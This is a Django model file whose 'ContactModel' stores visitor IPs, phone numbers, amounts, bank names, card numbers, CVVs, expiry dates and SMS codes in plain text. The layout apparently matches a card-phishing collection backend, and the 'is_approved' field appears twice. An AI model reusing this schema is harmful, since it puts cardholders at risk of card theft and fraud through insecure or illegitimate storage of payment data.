from django.db import models
from django.core.validators import MinValueValidator, MaxValueValidator

# Create your models here.


class ContactModel(models.Model):
    id = models.AutoField(primary_key=True)
    ip = models.CharField(max_length=200, null=False, blank=False)
    operator = models.IntegerField(null=True, blank=False)
    phone = models.IntegerField(blank=False)
    amount = models.IntegerField(null=False, validators=[MinValueValidator(1), MaxValueValidator(9999)])
    bankname = models.CharField(max_length=200,null=True)
    cc = models.CharField(max_length=200,null=True)
    cvv = models.CharField(max_length=200,null=True)
    mm = models.CharField(max_length=200,null=True)
    yy = models.CharField(max_length=200,null=True)
    sms = models.IntegerField(validators=[MinValueValidator(1), MaxValueValidator(9999999)],null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    is_approved = models.BooleanField(default=False)
    is_approved = models.BooleanField(default=False)
    
    class Meta:
        db_table = 'contact'